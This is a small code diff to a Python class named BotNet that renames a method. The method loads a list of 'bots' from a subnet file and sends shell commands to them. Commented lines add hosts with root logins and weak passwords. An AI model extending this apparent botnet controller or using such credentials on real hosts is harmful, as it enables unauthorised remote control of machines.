@@ -263,7 +263,7 @@ class BotNet:
     def opreate_bot(self, bot):
         print(bot.send_command('pwd'))
 
-    def getbot_by_file(self, file):
+    def buildnet_by_file(self, file):
         with open(file, 'r') as botfile:
             botnet_info = json.load(botfile)
             for bot in botnet_info:
@@ -301,7 +301,7 @@ def main():
 
 if __name__ == "__main__":
     net = BotNet()
-    net.getbot_by_file('/root/h/data/hData/bot/10.108.36.71mask16.txt')
+    net.buildnet_by_file('/root/h/data/hData/bot/10.108.36.71mask16.txt')
     # net.add_bot(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
     # net.add_bot(**{'host': '10.108.103.215', 'user': 'root', 'key': '123456789'})
     print(net)
